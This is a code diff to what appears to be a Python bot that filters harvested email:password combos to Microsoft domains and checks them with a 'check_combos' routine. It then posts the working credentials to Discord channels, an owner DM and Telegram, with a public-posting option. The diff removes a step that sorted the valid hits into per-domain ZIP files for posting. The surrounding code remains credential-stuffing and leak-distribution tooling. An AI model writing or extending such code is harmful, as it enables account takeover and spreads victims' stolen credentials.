@@ -16,7 +16,6 @@ from pathlib import Path
 
 import aiohttp
 import concurrent.futures
-import zipfile
 from mailhub import MailHub
 
 MS_DOMAINS = {"hotmail.com", "outlook.com", "live.com", "msn.com", "hotmail.co.uk",
@@ -436,7 +435,6 @@ async def monitor_loop():
                         if label == "mix":
                             log.info("Mix file detected, skipping checker")
                             valid_hits = all_raw
-                            sorted_zip = None
                         else:
                             # Filter to MS domains only before checking
                             ms_combos    = [c for c in all_raw if ":" in c and c.split(":", 1)[0].split("@")[-1].lower() in MS_DOMAINS]
@@ -449,22 +447,7 @@ async def monitor_loop():
                                 status_msg = None
                             valid_hits = await check_combos(ms_combos, status_msg=status_msg)
 
-                            # Build sorted-by-domain ZIP
-                            if valid_hits:
-                                domain_map = {}
-                                for combo in valid_hits:
-                                    domain = combo.split(":", 1)[0].split("@")[-1].lower()
-                                    domain_map.setdefault(domain, []).append(combo)
-                                log.info(f"Building ZIP with {len(domain_map)} domain(s): {list(domain_map.keys())}")
-                                zip_buf = io.BytesIO()
-                                with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
-                                    for domain, combos_d in domain_map.items():
-                                        zf.writestr(f"{domain}.txt", "\n".join(combos_d))
-                                zip_buf.seek(0)
-                                sorted_zip = zip_buf
-                                log.info("ZIP built successfully")
-                            else:
-                                sorted_zip = None
+
 
                         if not valid_hits:
                             log.info("No valid hits after checking, skipping post")
@@ -482,14 +465,7 @@ async def monitor_loop():
                                 log.info(f"Posted main file to Discord: {filename}")
                             except Exception as e:
                                 log.error(f"Failed to post main file to Discord: {e}")
-                            if sorted_zip:
-                                try:
-                                    sorted_zip.seek(0)
-                                    zip_filename = f"{len(valid_hits)} {label.upper()} SORTED.zip"
-                                    await content_channel.send(file=discord.File(fp=sorted_zip, filename=zip_filename))
-                                    log.info(f"Posted ZIP to Discord: {zip_filename}")
-                                except Exception as e:
-                                    log.error(f"Failed to post ZIP to Discord: {e}")
+
 
                         # DM owner
                         if toggles["owner_dm"]:
@@ -513,14 +489,6 @@ async def monitor_loop():
                             )
                             await send_telegram_file(tg_header + "\n".join(all_creds), filename)
 
-                            if sorted_zip:
-                                try:
-                                    sorted_zip.seek(0)
-                                    zip_filename = f"{len(valid_hits)} {label.upper()} SORTED.zip"
-                                    await send_telegram_file(sorted_zip.read(), zip_filename)
-                                    log.info(f"Posted ZIP to Telegram: {zip_filename}")
-                                except Exception as e:
-                                    log.error(f"Failed to post ZIP to Telegram: {e}")
 
                             if toggles["telegram_public"]:
                                 private_post_count_ref = globals()
